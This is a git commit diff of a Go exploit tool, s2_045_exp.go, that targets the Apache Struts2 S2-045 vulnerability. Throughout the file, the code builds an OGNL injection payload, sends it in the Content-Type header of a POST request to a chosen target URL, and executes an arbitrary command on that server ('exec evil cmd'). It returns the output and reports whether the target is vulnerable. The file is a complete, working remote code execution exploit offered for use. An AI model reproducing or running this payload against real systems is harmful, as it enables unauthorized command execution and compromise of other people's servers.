ce722b66f3a23ce5a3a9f34bbf74be6eaaf7128c
ev3rs0u1 <645298099@qq.com>
2017-03-08 21:52:40 +0800

    Add files via upload

--- s2_045_exp.go
+++ s2_045_exp.go
@@ -2,17 +2,18 @@ package main
 
 import (
     "fmt"
-    "time"
     "flag"
+    "time"
     "strings"
     "net/http"
     "io/ioutil"
 )
 
 var (
-    url string
-    cmd string
-    payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
+    vv  bool
+	url string
+	cmd string
+	payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
     "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
     "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
     "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())." +
@@ -22,36 +23,47 @@ var (
     "getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 )
 
+func catch() {
+	if err := recover(); err != nil {
+		fmt.Println("[-]", err)
+	}
+}
+
 func evilCmd(url string, cmd string) {
-    initPayload := strings.Replace(payload, "fuck", cmd, -1)
-    timeout := time.Duration(5 * time.Second)
-    client := &http.Client{Timeout: timeout}
-    req, err := http.NewRequest("POST", url, nil)
-    req.Header.Add("User-Agent", "WTF/1.0")
-    req.Header.Add("Content-Type", initPayload)
-    res, err := client.Do(req)
-    if err != nil { fmt.Println(err) }
-    if res.StatusCode == http.StatusOK {
-        fmt.Printf("[*]: %-12s => \"%s\"\n", "cmd", cmd)
-        for k, v := range res.Header {
-            fmt.Printf("[*]: %-12s => %s\n", k, v) 
-        }
-    } else {
-        fmt.Println("[-]:", cmd)
-        return
-    }
+    defer catch()
+	initPayload := strings.Replace(payload, "fuck", cmd, -1)
+	timeout := time.Duration(5 * time.Second)
+	client := &http.Client{Timeout: timeout}
+	req, _ := http.NewRequest("POST", url, nil)
+	req.Header.Add("User-Agent", "WTF/1.0")
+	req.Header.Add("Content-Type", initPayload)
+	res, err := client.Do(req)
+    if err != nil { panic("URL connection failed") }
     defer res.Body.Close()
-    body, _ := ioutil.ReadAll(res.Body)
-    fmt.Printf("\n%s", string(body))
+	bodyBytes, _ := ioutil.ReadAll(res.Body)
+    bodyString := string(bodyBytes)
+	exist := strings.Contains(bodyString, "</html>")
+	if (res.StatusCode == http.StatusOK) && (!exist) {
+        fmt.Println("[+]", "target is vulnerable")
+        if vv {
+            for k, v := range res.Header {
+                fmt.Printf("[*] %-12s => %s\n", k, v)
+            }
+        }
+        fmt.Printf("\n%s", bodyString)
+	} else {
+		panic("exploit failed")
+	}
 }
 
 func main() {
-    flag.StringVar(&cmd, "cmd", "whoami", "exec evil cmd")
-    flag.StringVar(&url, "url", "", "select attack url") 
-    flag.Parse()
-    if len(url) > 0 && len(cmd) > 0 {
-        evilCmd(url, cmd)
-    } else {
-        flag.Usage()
-    }
+    flag.BoolVar(&vv, "vv", false, "show details")
+	flag.StringVar(&cmd, "cmd", "whoami", "exec evil cmd")
+	flag.StringVar(&url, "url", "", "target URL (e.g. \"http://www.site.com/index.action\")")
+	flag.Parse()
+	if len(url) > 0 && len(cmd) > 0 {
+		evilCmd(url, cmd)
+	} else {
+		flag.Usage()
+	}
 }
